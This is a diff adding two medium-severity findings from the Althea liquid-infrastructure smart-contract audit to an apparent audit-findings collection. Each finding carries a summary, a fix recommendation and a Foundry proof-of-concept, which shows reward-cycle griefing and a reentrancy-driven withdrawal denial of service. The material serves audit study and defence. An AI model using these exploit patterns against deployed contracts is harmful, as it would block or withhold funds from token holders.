@@ -632,3 +632,194 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 11.[Medium] Malicious users can prevent holders from claiming their rewards during a reward cycle by skipping it
+
+### Claim rewards
+
+- Summary: Even if there are no rewards available, a malicious user can trigger the distribution process and set a boolean flag to lock the distribution, preventing anyone from claiming rewards. Consequently, the next reward cycle is delayed until after a certain number of blocks have passed.
+
+- Impact & Recommendation: Only initiate reward cycles when there are rewards available in the liquidNFT transferred to the liquidERC20, preventing malicious manipulation.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-althea-liquid-infrastructure#m-02-malicious-users-can-prevent-holders-from-claiming-their-rewards-during-a-reward-cycle-by-skipping-it) & [Report](https://code4rena.com/reports/2024-02-thruster)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+  // SPDX-License-Identifier: UNLICENSED
+  pragma solidity 0.8.12;
+  // git clone https://github.com/althea-net/liquid-infrastructure-contracts.git
+  // cd liquid-infrastructure-contracts/
+  // npm install
+  // forge init --force
+  // vim test/Test.t.sol
+      // save this test file
+  // run using:
+  // forge test --match-test "testGrieveCycles" -vvvv
+  import {Test, console2} from "forge-std/Test.sol";
+  import { LiquidInfrastructureERC20 } from "../contracts/LiquidInfrastructureERC20.sol";
+  import { LiquidInfrastructureNFT } from "../contracts/LiquidInfrastructureNFT.sol";
+  import { TestERC20A } from "../contracts/TestERC20A.sol";
+  import { TestERC20B } from "../contracts/TestERC20B.sol";
+  import { TestERC20C } from "../contracts/TestERC20C.sol";
+  import { TestERC721A } from "../contracts/TestERC721A.sol";
+  contract ERC20Test is Test {
+      LiquidInfrastructureERC20 liquidERC20;
+      TestERC20A erc20A;
+      TestERC20B erc20B;
+      TestERC20C erc20C;
+      LiquidInfrastructureNFT liquidNFT;
+      address owner = makeAddr("Owner");
+      address alice = makeAddr("Alice");
+      address bob = makeAddr("Bob");
+      address charlie = makeAddr("Charlie");
+      address delta = makeAddr("Delta");
+      address eve = makeAddr("Eve");
+      address malicious_user = makeAddr("malicious_user");
+
+      function setUp() public {
+      vm.startPrank(owner);
+      // Create a rewardToken
+      address[] memory ERC20List = new address[](1);
+      erc20A = new TestERC20A();
+      ERC20List[0] = address(erc20A);
+      // Create managed NFT
+      address[] memory ERC721List = new address[](1);
+      liquidNFT = new LiquidInfrastructureNFT("LIQUID");
+      ERC721List[0] = address(liquidNFT);
+      // Create approved holders
+      address[] memory holderList = new address[](5);
+      holderList[0] = alice;
+      holderList[1] = bob;
+      holderList[2] = charlie;
+      holderList[3] = delta;
+      holderList[4] = eve;
+      // Create liquidERC20 and mint liquidERC20 to the approved holders
+      liquidERC20 = new LiquidInfrastructureERC20("LiquidERC20", "LIQ", ERC721List, holderList, 210000, ERC20List);
+      liquidERC20.mint(alice, 1e18);
+      liquidERC20.mint(bob, 1e18);
+      liquidERC20.mint(charlie, 1e18);
+      liquidERC20.mint(delta, 1e18);
+      liquidERC20.mint(eve, 1e18);
+      // Add threshold and rewardToken to liquidNFT
+      uint256[] memory amountList = new uint256[](1);
+      amountList[0] = 100;
+      liquidNFT.setThresholds(ERC20List, amountList);
+      liquidNFT.transferFrom(owner, address(liquidERC20), 1);
+      // Mint 5e18 rewardTokens to liquidNFT
+      erc20A.mint(address(liquidNFT), 5e18);
+      vm.stopPrank();
+      }
+      function testGrieveCycles() public {
+      // Go to block 210001, call withdrawFromAllManagedNFTs to get the rewards, and distribute everything to bring the token balance of the reward token to 0. This is just a sanity check.
+      vm.roll(210001);
+      liquidERC20.withdrawFromAllManagedNFTs();
+      liquidERC20.distributeToAllHolders();
+      // Go to block ((210000 * 2) + 1).
+      vm.roll(420001);
+      // Malicious user calls distribute
+      // This makes it temporarily unavailable to withdraw the rewards.
+      vm.prank(malicious_user);
+      liquidERC20.distribute(1);
+
+      // Rewards can't be pulled or withdrawn from the ERC20 contract.
+      vm.expectRevert();
+      vm.prank(owner);
+      liquidERC20.withdrawFromAllManagedNFTs();
+      // This sets the next reward period to start at ((210000 * 3) + 1).
+      vm.startPrank(owner);
+      liquidERC20.distributeToAllHolders();
+      liquidERC20.withdrawFromAllManagedNFTs();
+      vm.stopPrank();
+      // Alice tried to get the rewards she had earned but could not get them, even with the rewards being in this contract, because the next reward cycle
+      // starts at block ((210000 * 2) + 1).
+      vm.expectRevert();
+      vm.prank(alice);
+      liquidERC20.distributeToAllHolders();
+      }
+  }
+
+  ```
+
+  </details>
+
+## 12.[Medium] Withdrawal from NFTs can be temporarily blocked
+
+### i can not become greater than length
+
+- Summary: If nextWithdrawal exceeds the number of managed NFTs, the contract cannot withdraw revenue. This could happen if NFTs are released after withdrawFromManagedNFTs calls or if malicious users exploit ERC20 operation changes to manipulate the process.
+
+- Impact & Recommendation: Consider modifying a check to makesure nextWithdrawal can not become greater than ManagedNFTs length.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-althea-liquid-infrastructure#m-04-withdrawal-from-nfts-can-be-temporarily-blocked) & [Report](https://code4rena.com/reports/2024-02-thruster)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+  import {LiquidInfrastructureERC20, ERC20} from "../contracts/LiquidInfrastructureERC20.sol";
+  import {LiquidInfrastructureNFT} from "../contracts/LiquidInfrastructureNFT.sol";
+  import {Test} from "forge-std/Test.sol";
+  import "forge-std/console.sol";
+  contract Exploit {
+      LiquidInfrastructureERC20 target;
+      constructor(LiquidInfrastructureERC20 _target) {
+          target = _target;
+      }
+      function onERC721Received(address, address, uint256, bytes memory) public virtual returns (bytes4) {
+          // set counter
+          target.withdrawFromManagedNFTs(2);
+          return this.onERC721Received.selector;
+      }
+  }
+  contract MockToken is ERC20 {
+      constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
+      function mint(address to, uint256 amount) external {
+          _mint(to, amount);
+      }
+  }
+  contract C4 is Test {
+      LiquidInfrastructureERC20 liqERC20;
+      MockToken usdc;
+      address alice;
+      address bob;
+      function setUp() public {
+          alice = address(0xa11cE);
+          bob = address(0xb0b);
+          usdc = new MockToken("USDC", "USDC");
+          address[] memory rewards = new address[](1);
+          rewards[0] = address(usdc);
+          address[] memory approved = new address[](3);
+          approved[0] = address(this);
+          approved[1] = alice;
+          approved[2] = bob;
+          address[] memory nfts = new address[](3);
+          nfts[0] = address(new LiquidInfrastructureNFT("NAME"));
+          nfts[1] = address(new LiquidInfrastructureNFT("NAME"));
+          nfts[2] = address(new LiquidInfrastructureNFT("NAME"));
+          liqERC20 = new LiquidInfrastructureERC20("LIQ", "LIQ", nfts, approved, 10, rewards);
+          for(uint256 i=0; i<nfts.length; i++) {
+              usdc.mint(nfts[i], 1_000_000 * 1e18);
+              LiquidInfrastructureNFT(nfts[i]).setThresholds(rewards, new uint256[](1));
+              LiquidInfrastructureNFT(nfts[i]).transferFrom(address(this), address(liqERC20), 1);
+          }
+      }
+      function testWithdrawDOS() public {
+          Exploit exploit = new Exploit(liqERC20);
+          address nft = liqERC20.ManagedNFTs(0);
+          address toRelease1 = liqERC20.ManagedNFTs(1);
+          address toRelease2 = liqERC20.ManagedNFTs(2);
+          liqERC20.withdrawFromAllManagedNFTs();
+          assertEq(usdc.balanceOf(address(liqERC20)), 3_000_000 * 1e18);
+          uint256 balBefore = usdc.balanceOf(address(liqERC20));
+          liqERC20.releaseManagedNFT(toRelease2, address(exploit));
+          liqERC20.releaseManagedNFT(toRelease1, alice);
+          // new rewards are ready
+          usdc.mint(nft, 1_000_000 * 1e18);
+          liqERC20.withdrawFromAllManagedNFTs();
+          uint256 balAfter = usdc.balanceOf(address(liqERC20));
+          // 1 mil wasn't withdrawn
+          assertEq(balBefore, balAfter);
+      }
+  }
+
+  ```
+
+  </details>
